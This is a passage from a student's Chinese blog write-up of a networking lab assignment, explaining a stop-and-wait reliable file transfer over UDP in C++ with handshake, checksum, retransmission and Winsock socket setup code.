<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201212234000727.png"  alt="image-20201212234000727" style="zoom: 50%;">



<p>上图描绘了在正常情况下的发送流程，由于本次采用<strong>停等</strong>机制，client端每次发送消息后，都要接收到对方回复的<strong>对应的ACK</strong>（即收到ACK消息的ackseq=发出消息的msgseq）才能发能发送下一条指令</p>
<h2 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h2><p><strong>正常情况</strong>下的连接建立过程：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213095738718.png"  alt="image-20201213095738718" style="zoom:50%;">



<p>​        客户端发送带有标识<strong>SYN</strong>的消息x，接收到对方<strong>对消息x的确认消息ACK</strong>。由于只是<strong>单项传输</strong>，所以<strong>两次握手</strong>即可</p>
<p><strong>出现异常情况</strong>下的处理过程</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213100455796.png"  alt="image-20201213100455796" style="zoom: 25%;">

<ul>
<li>==注意==，为了处理server返回<strong>ACK丢包</strong>导致的两端状态不同步和其它<strong>异常</strong>情况，server端的<strong>三个状态</strong>均可以接收<strong>SYN</strong>请求，也均可以接收<strong>FIN</strong>断开请求</li>
<li>消息①：<strong>ACK丢包</strong>，client端超过一段时间没收到ACK后<strong>重新发送SYN</strong></li>
<li>消息②：部分信息丢失或被篡改，即<strong>校验和出错</strong>，server端<strong>不返回ACK</strong>，client端检测到没有在规定时间接收到ACK后<strong>重新发送</strong>消息</li>
<li>消息③：server端虽然返回了ACK，但由于某些原因client端<strong>没有在规定时间内接收到ACK</strong>，client端仍需要重传</li>
<li>消息④：client端发出消息④后，在超时时限内收到了<strong>两条ACK</strong>，且ackseq相同，由于这两条ACK是对仅仅是由重传造成的相同消息的确认，故具有<strong>相同效力</strong>，取<strong>较早收到的ACK</strong>即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buildconnectionCli</span><span class="params">()</span><span class="comment">//客户端，连接发起方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	message a, b;</span><br><span class="line">	a.set_syn();<span class="comment">//SYN=1</span></span><br><span class="line">	a.msgseq = sendseq++;<span class="comment">//设置发送序号</span></span><br><span class="line">	<span class="keyword">if</span> (stopwaitsend(a, b))<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//stopwait函数功能为发送消息a，发生超时事件重传，如果收到了对应的ACK消息b则返回1，超过重传次数依然没有收到返回0</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//stopwait函数返回0，即没有收到对方返回的消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buildconnectionSer</span><span class="params">(message t)</span><span class="comment">//服务端建立连接</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//message t为收到的带有syn标志位的消息</span></span><br><span class="line">	message a,b;</span><br><span class="line">	a.set_ack(t);<span class="comment">//回复对于消息t的ACK</span></span><br><span class="line">	a.msgseq = sendseq++;<span class="comment">//设置消息a的发送序号，这里的设置只是为了程序的统一性，由于只是单向传输，client端只需检查server端发送的ackseq字段不需要检查msgseq字段，所以不会用到</span></span><br><span class="line">	simplesend(a);<span class="comment">//发送消息a</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"连接成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//server端接收到syn消息就代表对于server端连接已经建立</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="连接断开"><a href="#连接断开" class="headerlink" title="连接断开"></a>连接断开</h2><p>这里与连接建立类似，由于是单向传输，只需要两次挥手即可，程序逻辑与连接建立类似，client端发送含有<strong>FIN</strong>的消息，server端收到后回复对应的<strong>ACK</strong>，连接断开</p>
<h2 id="差错重传"><a href="#差错重传" class="headerlink" title="差错重传"></a>差错重传</h2><p>使用<strong>校验和</strong>方式检测是否出现差错，校验和计算方式与rdt3.0类似，只是根据本次实验设计的报文格式进行了简单修改。校验和计算包括0-255bit。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213165032779.png"  alt="image-20201213165032779" style="zoom:25%;">

<p>计算方法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message::setchecksum</span><span class="params">()</span><span class="comment">//发送方计算校验和并填入响应位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	u_char* temp = (u_char*)<span class="keyword">this</span>;<span class="comment">//以1B为单位进行处理，注意设置为unsigned类型，否则在后续相加时会按照默认最高位是正负号，影响计算结果</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)<span class="comment">//取报文的前16组，每组16bit，共计32字节256bit</span></span><br><span class="line">	&#123;</span><br><span class="line">		sum += temp[<span class="number">2</span> * i] &lt;&lt; <span class="number">8</span> + temp[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)</span><br><span class="line">		&#123;<span class="comment">//溢出</span></span><br><span class="line">			<span class="keyword">int</span> t = sum &gt;&gt; <span class="number">16</span>;<span class="comment">//将最高位回滚添加至最低位</span></span><br><span class="line">			sum += t;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">this</span>-&gt;checksum = ~(u_short)sum;<span class="comment">//按位取反，方便校验计算</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">message::checkchecksum</span><span class="params">()</span><span class="comment">//接收方对校验和进行检验</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	u_char* temp = (u_char*)<span class="keyword">this</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum += temp[<span class="number">2</span> * i] &lt;&lt; <span class="number">8</span> + temp[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">while</span> (sum &gt;= <span class="number">0x10000</span>)</span><br><span class="line">		&#123;<span class="comment">//溢出</span></span><br><span class="line">			<span class="keyword">int</span> t = sum &gt;&gt; <span class="number">16</span>;<span class="comment">//计算方法与设置校验和相同</span></span><br><span class="line">			sum += t;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//把计算出来的校验和和报文中该字段的值相加，如果等于0xffff，则校验成功</span></span><br><span class="line">	<span class="keyword">if</span> (checksum + (u_short)sum == <span class="number">65535</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据rdt3.0，当server端检测到校验和错误时，<strong>不发送NAK</strong>，也<strong>不返回ACK</strong>，只是等待client端<strong>超时重新发送</strong>。</p>
<h2 id="确认重传"><a href="#确认重传" class="headerlink" title="确认重传"></a>确认重传</h2><p>前面在连接建立部分已经简要进行介绍，当client端无法<strong>在规定时间内接收到相应消息的ACK</strong>时，重传消息</p>
<p>主要涉及以下几种情况</p>
<ul>
<li><p>server端检测<strong>校验和出错</strong>，不发送ACK</p>
</li>
<li><p>server端发送的<strong>ACK丢包</strong></p>
</li>
<li><p>server端发送的<strong>ACK未在超时时限内收到</strong></p>
</li>
</ul>
<p><strong>注：这里的recv函数非阻塞</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">stopwaitsend</span><span class="params">(message&amp; a, message b)</span><span class="comment">//a写入待发送消息，如果收到对方返回的ack则成功</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	simplesend(a);<span class="comment">//发送消息a</span></span><br><span class="line">	clockstart = clock();<span class="comment">//timer</span></span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;<span class="comment">//重发超过10次退出</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;<span class="comment">//这里的recv函数非阻塞</span></span><br><span class="line">		simplerecv(b);<span class="comment">//接收对方发送的消息b</span></span><br><span class="line">		<span class="keyword">if</span> (b.get_ack()&amp;&amp;b.ackseq==a.msgseq)<span class="comment">//b包含对消息a的ack</span></span><br><span class="line">		&#123;<span class="comment">//已收到对于消息a的确认，返回1</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		clockend = clock();</span><br><span class="line">		<span class="keyword">if</span> (flag == SENT_TIMES)<span class="comment">//重发10次依然失败</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> ((clockend - clockstart) / CLOCKS_PER_SEC &gt;= WAIT_TIME)<span class="comment">//超时</span></span><br><span class="line">		&#123;</span><br><span class="line">			flag++;</span><br><span class="line">			clockstart = clock();<span class="comment">//重置计时器</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"重传"</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			simplesend(a);<span class="comment">//重传</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//0代表发送失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="停等机制"><a href="#停等机制" class="headerlink" title="停等机制"></a>停等机制</h2><p>该机制下client端每发送一条消息，都需要等待接收到对方返回的ACK才能发送下一条，client端代码即解释见<strong>确认重传</strong>部分，这里对server端代码进行解释，即收到client端的消息且检测校验和正确后，向对方发送相应消息的ACK</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">stopwaitrecv</span><span class="params">(message&amp; a, message b)</span><span class="comment">//收到的消息写入a中</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		simplerecv(a);<span class="comment">//收到对方发来的消息a</span></span><br><span class="line">		<span class="keyword">if</span> (a.get_exist())<span class="comment">//因为将recv函数设成了非阻塞，所以需要检测收到的消息是否为空</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> check = a.checkchecksum();<span class="comment">//检测校验和</span></span><br><span class="line">			<span class="keyword">if</span> (a.checkchecksum())<span class="comment">//检测成功</span></span><br><span class="line">			&#123;</span><br><span class="line">				b.set_ack(a);<span class="comment">//回复对于收到消息a的ack消息b</span></span><br><span class="line">				b.msgseq = sendseq++;</span><br><span class="line">				simplesend(b);</span><br><span class="line">				<span class="built_in">memset</span>((<span class="keyword">char</span>*)&amp;b, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));<span class="comment">//防止干扰下一次消息接收</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"接收失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="给定测试文件的传输"><a href="#给定测试文件的传输" class="headerlink" title="给定测试文件的传输"></a>给定测试文件的传输</h2><p><strong>client端：</strong></p>
<ul>
<li>读入文件至内存中</li>
<li>文件起始消息<strong>SF置1</strong>，将发送文件所需要的<strong>消息条数index</strong>和<strong>最后一条消息msg段有效位数</strong>填入报头中<strong>index</strong>和<strong>filelength</strong>相应位置，<strong>msg成员填入文件名</strong></li>
<li>将内存中的消息复制到message类对象的msg段，逐条发送</li>
<li>最后一条消息<strong>EF置1</strong>，告知对方文件发送结束</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读入文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readfile</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span> content[<span class="number">10000</span>][<span class="number">1024</span>],<span class="keyword">int</span> &amp;length,  <span class="keyword">int</span>  &amp; index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	index = <span class="number">0</span>;</span><br><span class="line">	length = <span class="number">0</span>;</span><br><span class="line">	<span class="function">ifstream <span class="title">in</span><span class="params">(name, ifstream::binary)</span></span>;<span class="comment">//以二进制方式读入文件</span></span><br><span class="line">	<span class="keyword">if</span> (!in)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"文件无效"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> t = in.<span class="built_in">get</span>();</span><br><span class="line">	<span class="keyword">while</span> (in)<span class="comment">//如果读入失败（读入完成）则退出</span></span><br><span class="line">	&#123;<span class="comment">//将文件内容存入content数组中</span></span><br><span class="line">		content[index][length % <span class="number">1024</span>] = t;<span class="comment">//每行1024个字节，对应msg成员长度为1024</span></span><br><span class="line">		length++;</span><br><span class="line">		<span class="keyword">if</span> (length % <span class="number">1024</span> == <span class="number">0</span>)<span class="comment">//上一条缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">			index++; length = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		t = in.<span class="built_in">get</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	in.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sendfile</span><span class="params">(<span class="keyword">char</span>* name)</span><span class="comment">//发送文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"开始发送文件"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	 <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	readfile( name,content,length,index);<span class="comment">//读入文件</span></span><br><span class="line">	<span class="keyword">clock_t</span> timestart = clock();<span class="comment">//timer</span></span><br><span class="line">    <span class="comment">//组装文件开始消息</span></span><br><span class="line">	message a;</span><br><span class="line">	a.index = index;</span><br><span class="line">	a.filelength = length;</span><br><span class="line">	<span class="keyword">int</span> t = <span class="built_in">strlen</span>(name);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; i++)</span><br><span class="line">		a.msg[i]=name[i];<span class="comment">//msg已经初始化全部为0</span></span><br><span class="line">	a.set_startfile();<span class="comment">//SF=1</span></span><br><span class="line">	message b;</span><br><span class="line">	a.msgseq = sendseq++;</span><br><span class="line">	<span class="keyword">if</span> (!stopwaitsend(a, b))<span class="comment">//发送消息a，等待接收ACK，该函数包括超时重传等功能</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"文件传输失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= index; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		message temp;</span><br><span class="line">		<span class="keyword">if</span> (i == index)</span><br><span class="line">		&#123;</span><br><span class="line">			temp.set_endfile();</span><br><span class="line">            <span class="comment">//注意文件内容中会有'\0',不可以使用strcpy</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">				temp.msg[j] = content[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;<span class="comment">//消息固定长度为1024</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1024</span>; j++)</span><br><span class="line">				temp.msg[j] = content[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		temp.msgseq = sendseq++;<span class="comment">//设置消息序号</span></span><br><span class="line">		<span class="keyword">if</span> (stopwaitsend(temp,b)== <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"文件发送失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//吞吐率计算</span></span><br><span class="line">	<span class="keyword">clock_t</span> timeend = clock();</span><br><span class="line">	<span class="keyword">double</span> endtime = (<span class="keyword">double</span>)(timeend - timestart) / CLOCKS_PER_SEC;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Total time:"</span> &lt;&lt; endtime &lt;&lt; <span class="built_in">endl</span>;		<span class="comment">//s为单位</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"吞吐率："</span> &lt;&lt; (<span class="keyword">double</span>)(index + <span class="number">1</span>) * <span class="keyword">sizeof</span>(message) * <span class="number">8</span>/endtime /<span class="number">1024</span>/<span class="number">1024</span>&lt;&lt; <span class="string">"Mbps"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"文件发送成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//发送成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>server端：</strong></p>
<ul>
<li>接收到包含<strong>SF=1</strong>的消息，读出<strong>index、filelength和文件名</strong>，返回ACK</li>
<li>循环接收对方发来的消息，将<strong>msg段复制到内存中</strong>，逐条返回ACK</li>
<li>当收到的消息包含标识为<strong>EF</strong>时，表示该条消息<strong>msg段有效位数为filelength</strong>，将其复制到内存中。校验<strong>index与收到文件消息的条数</strong>，如果正确返回ACK</li>
<li>将内存中的数据写入文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recvfile</span><span class="params">(message a)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//a为包含SF的消息</span></span><br><span class="line">	message t;</span><br><span class="line">	t.set_ack(a);<span class="comment">//回复对于该消息的确认</span></span><br><span class="line">	a.msgseq = sendseq++;</span><br><span class="line">	simplesend(t);</span><br><span class="line">    <span class="comment">//获取文件基本信息</span></span><br><span class="line">	<span class="keyword">int</span> index = a.index;</span><br><span class="line">	<span class="keyword">int</span> length = a.filelength;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">30</span>];</span><br><span class="line">	<span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; a.msg[i]; i++)</span><br><span class="line">		name[i] = a.msg[i];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= index; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		message b, c;</span><br><span class="line">		<span class="built_in">memset</span>(content[i], <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">        <span class="comment">//将收到的消息复制到内存中</span></span><br><span class="line">		<span class="keyword">if</span> (stopwaitrecv(b, c))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (i == index)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">					content[i][j] = b.msg[j];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">1024</span>; j++)</span><br><span class="line">					content[i][j] = b.msg[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"出错0"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (i == index)</span><br><span class="line">		&#123;<span class="comment">//消息条数校验</span></span><br><span class="line">			<span class="keyword">if</span>(!b.get_endfile())</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"出错1"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//将content中存储的内容输出到文件名为name的文件中</span></span><br><span class="line">	outfile(name, content, length, index);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;name&lt;&lt; <span class="string">" 文件接收成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outfile</span><span class="params">(<span class="keyword">char</span>* name, <span class="keyword">char</span> content[<span class="number">50000</span>][<span class="number">1024</span>], <span class="keyword">int</span> length, <span class="keyword">int</span>&amp; index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">ofstream <span class="title">fout</span><span class="params">(name, ofstream::binary)</span></span>;<span class="comment">//以二进制方式写入文件</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; FILE_PACKET_LENGTH; j++)</span><br><span class="line">			fout &lt;&lt; content[i][j];<span class="comment">//以字节为单位进行写入</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; length; j++)</span><br><span class="line">		fout &lt;&lt; content[index][j];</span><br><span class="line">	fout.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="程序执行界面展示"><a href="#程序执行界面展示" class="headerlink" title="程序执行界面展示"></a>程序执行界面展示</h3><p><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213110800797.png"  alt="image-20201213110800797" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网作业3-1/image-20201213110836519.png"  alt="image-20201213110836519" style="zoom: 50%;"></p>
<h3 id="socket的创建"><a href="#socket的创建" class="headerlink" title="socket的创建"></a>socket的创建</h3><p><strong>头文件</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;//windows socket 编程头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)<span class="comment">//链接ws2_32.lib库文件到此项目中</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载socket库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="comment">//MAKEWORD(2.2),成功返回0</span></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"socket初始化失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建Socket</span></span><br><span class="line"><span class="comment">//创建一个socket，并将该socket绑定到一个特定的传输层</span></span><br><span class="line">sock = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);<span class="comment">//地址类型（ipv4）,数据报套接字</span></span><br><span class="line"><span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"socket创建失败"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置recv函数为非阻塞</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">timeout.tv_sec = <span class="number">1</span>;<span class="comment">//秒</span></span><br><span class="line">timeout.tv_usec = <span class="number">0</span>;<span class="comment">//微秒</span></span><br><span class="line"><span class="keyword">if</span> (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span>*)&amp;timeout, <span class="keyword">sizeof</span>(timeout)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"setsockopt failed:"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"server3-1"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//初始化地址,代码支持输入IP，这里只演示了使用默认IP的情况</span></span><br><span class="line">addrop.sin_addr.s_addr = inet_addr(<span class="string">"192.168.89.1"</span>);</span><br><span class="line">addrop.sin_family = AF_INET;<span class="comment">//IPv4</span></span><br><span class="line">addrop.sin_port = htons(SPORT);<span class="comment">//端口，30000</span></span><br><span class="line"></span><br><span class="line">addr.sin_addr.s_addr = inet_addr(<span class="string">"192.168.89.1"</span>);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(CPORT);<span class="comment">//6666</span></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="comment">//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输</span></span><br><span class="line"><span class="comment">//server端需要bind而client端不需要</span></span><br><span class="line"><span class="keyword">if</span> (bind(sock, (SOCKADDR*)&amp;addrop, <span class="keyword">sizeof</span>(SOCKADDR)) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"bind error"</span> &lt;&lt; <span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......<span class="comment">//程序执行，消息收发</span></span><br><span class="line">closesocket(sock);<span class="comment">//关闭socket</span></span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p><strong>消息的发送与接收</strong></p>
<p>为了简化后续代码，将send和recv简化封装成函数</p>
<p>注意这里由于使用的是<strong>UDP</strong>，每次发送和接收都需要<strong>指明目的或者来源IP地址</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simplesend</span><span class="params">(message&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a.set_exist();<span class="comment">//表示该条消息存在，方便非阻塞式recv判断是否接收到了消息</span></span><br><span class="line">	a.setchecksum();<span class="comment">//设置校验和</span></span><br><span class="line">	<span class="comment">//用sock发送a中的内容，注意第二个参数是char*，所以需要强制类型转换</span></span><br><span class="line">    <span class="comment">//第三个参数为发送缓冲区长度，注意不能设置过长，否则会造成缓冲区溢出</span></span><br><span class="line">    <span class="comment">//第四个代表相关操作，一般设置为0</span></span><br><span class="line">    <span class="comment">//第五个是目的IP地址，即向哪个IP发送消息</span></span><br><span class="line">    <span class="comment">//第六个是addr的长度</span></span><br><span class="line">	<span class="keyword">if</span> (sendto(sock, (<span class="keyword">char</span>*)&amp;a, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) == SOCKET_ERROR);<span class="comment">//如果发送失败，这里由于后续有确认重传机制，不在发送函数中进行处理</span></span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">    <span 